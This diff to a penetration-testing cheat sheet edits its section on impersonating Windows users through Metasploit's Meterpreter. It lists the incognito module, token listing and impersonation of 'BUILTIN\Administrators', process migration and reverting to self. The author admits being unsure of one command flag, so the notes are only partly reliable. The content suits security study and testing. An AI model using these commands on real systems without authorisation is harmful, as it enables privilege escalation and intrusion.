@@ -63,12 +63,14 @@ description: A Metasploit attack payload that provides an interactive shell.
 
 ## METERPRETER Impersonate
 
-When **SeDebugPrivilege** and **SeImpersonatePrivilege** are enabled, we can impersonate another user.
+If the current user has **SeDebugPrivilege** and **SeImpersonatePrivilege** privileges enabled, we are able to impersonate another user.
 
  > 
  > **<font color=red>load incognito</font>**</br>
- > **<font color=red>list_tokens -g</font>**</br>
- > List tokens.
+ > Load icognito module.
+ > 
+ > **<font color=red>list_tokens -u</font>**</br>
+ > List Delegation Tokens available (not sure of the flag maybe `-g`).
  > 
  > **<font color=red>impersonate_token</font> "BUILTIN\\Administrators"**</br>
  > Impersonate token.
@@ -80,6 +82,10 @@ The safest to pick is **services.exe**.
  > 
  > **<font color=red>migrate</font> 668**</br>
  > Migrate to process 668.
+
+ > 
+ > **<font color=red>rev2self</font>**</br>
+ > Revert to previous user.
 
 ## METERPRETER Pivoting
 
